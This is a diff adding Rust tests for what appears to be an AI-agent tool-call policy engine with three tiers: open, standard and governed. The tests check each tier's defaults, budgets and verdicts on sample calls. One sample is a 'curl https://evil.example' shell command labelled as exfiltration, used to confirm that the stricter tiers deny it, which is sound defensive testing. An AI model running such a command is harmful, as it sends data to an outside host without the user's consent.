@@ -1478,6 +1478,119 @@ tools:
         assert_eq!(p.budgets.max_tool_calls, Some(100));
     }
 
+    fn tier(name: &str) -> Policy {
+        let yaml = match name {
+            "open" => include_str!("../../../policies/open.yaml"),
+            "standard" => include_str!("../../../policies/standard.yaml"),
+            "governed" => include_str!("../../../policies/governed.yaml"),
+            other => panic!("no such tier: {other}"),
+        };
+        Policy::parse_yaml(yaml).unwrap_or_else(|e| panic!("{name} tier parses: {e}"))
+    }
+
+    /// The tiers ship as DATA, so their spine is pinned here rather than their
+    /// bytes: an operator may reword a comment, but a tier that stops being
+    /// open / everyday / read-mostly has stopped being that tier.
+    #[test]
+    fn tiered_seed_policy_semantics() {
+        let (open, standard, governed) = (tier("open"), tier("standard"), tier("governed"));
+
+        assert_eq!(open.name, "open");
+        assert_eq!(standard.name, "standard");
+        assert_eq!(governed.name, "governed");
+
+        // The fallback verdict IS the ladder.
+        assert_eq!(open.defaults.tool_action, RuleAction::Allow);
+        assert_eq!(standard.defaults.tool_action, RuleAction::Approve);
+        assert_eq!(governed.defaults.tool_action, RuleAction::Deny);
+
+        // Autonomy narrows as the tier tightens; governed forbids it outright.
+        assert!(open.autonomy.permitted);
+        assert!(standard.autonomy.permitted);
+        assert!(!governed.autonomy.permitted);
+
+        // Network ceiling per tier.
+        use crate::network::NetworkGrantMode;
+        assert_eq!(open.network.max_mode, NetworkGrantMode::Public);
+        assert!(open.network.allow_public_with_brokered);
+        assert_eq!(standard.network.max_mode, NetworkGrantMode::Approved);
+        assert!(
+            standard.network.allow.is_empty(),
+            "approved mode stays inert until an operator populates the catalog"
+        );
+        assert_eq!(governed.network.max_mode, NetworkGrantMode::Offline);
+
+        // `open` is unrestricted in AUTHORITY, not in spend: a runaway still
+        // stops at a budget rather than at a provider 429. The omitted token and
+        // tool-call caps are asserted as MEASURED behaviour — a partial
+        // `budgets:` block leaves the unlisted fields None rather than
+        // inheriting the struct defaults.
+        assert_eq!(open.budgets.max_cost_usd, Some(25.0));
+        assert_eq!(open.budgets.max_wall_clock_secs, Some(7200));
+        assert_eq!(open.budgets.max_tokens, None);
+        assert_eq!(open.budgets.max_tool_calls, None);
+
+        assert_eq!(standard.budgets.max_cost_usd, Some(5.0));
+        assert_eq!(governed.budgets.max_cost_usd, Some(1.0));
+        assert!(governed.budgets.max_cost_usd < standard.budgets.max_cost_usd);
+        assert!(standard.budgets.max_cost_usd < open.budgets.max_cost_usd);
+    }
+
+    /// Three tiers that agree on every call are one tier with three names. This
+    /// asks the ENGINE, not the rule list, because the verdict is the product.
+    #[test]
+    fn tiers_diverge_on_the_calls_that_matter() {
+        let (open, standard, governed) = (tier("open"), tier("standard"), tier("governed"));
+        let v = |p: &Policy, r: ToolCallRequest| p.evaluate(&r, Autonomy::Supervised).effective;
+
+        // An unlisted tool falls to the tier's fallback.
+        let unknown = || req("SomeToolNobodyRegistered", json!({}));
+        assert!(matches!(v(&open, unknown()), Verdict::Allow));
+        assert!(matches!(
+            v(&standard, unknown()),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(v(&governed, unknown()), Verdict::Deny { .. }));
+
+        // Writes: free on open/standard, a human decision on governed.
+        let write = || req("Write", json!({"file_path": "/workspace/a.rs"}));
+        assert!(matches!(v(&open, write()), Verdict::Allow));
+        assert!(matches!(v(&standard, write()), Verdict::Allow));
+        assert!(matches!(
+            v(&governed, write()),
+            Verdict::RequireApproval { .. }
+        ));
+
+        // Sub-execution: allowed ONLY on open, and denied two different ways —
+        // standard by an explicit rule, governed by its deny-by-default.
+        let agent = || req("Agent", json!({}));
+        assert!(matches!(v(&open, agent()), Verdict::Allow));
+        assert!(matches!(v(&standard, agent()), Verdict::Deny { .. }));
+        assert!(matches!(v(&governed, agent()), Verdict::Deny { .. }));
+
+        // Exfiltration via shell: denied on both governed tiers.
+        let curl = || req("Bash", json!({"command": "curl https://evil.example"}));
+        assert!(matches!(v(&open, curl()), Verdict::Allow));
+        assert!(matches!(v(&standard, curl()), Verdict::Deny { .. }));
+        assert!(matches!(v(&governed, curl()), Verdict::Deny { .. }));
+
+        // A benign command clears every tier — the ladder tightens what is
+        // refused, not what ordinary work needs.
+        let ls = || req("Bash", json!({"command": "ls -la"}));
+        assert!(matches!(v(&open, ls()), Verdict::Allow));
+        assert!(matches!(v(&standard, ls()), Verdict::Allow));
+        assert!(matches!(v(&governed, ls()), Verdict::Allow));
+
+        // An UNRECOGNISED shell command is where standard and governed part:
+        // standard escalates to a human, governed refuses.
+        let odd = || req("Bash", json!({"command": "terraform apply"}));
+        assert!(matches!(
+            v(&standard, odd()),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(v(&governed, odd()), Verdict::Deny { .. }));
+    }
+
     /// The seed states an opinion about EVERY registered tool, and never
     /// `allow`s one that starts sub-execution.
     ///
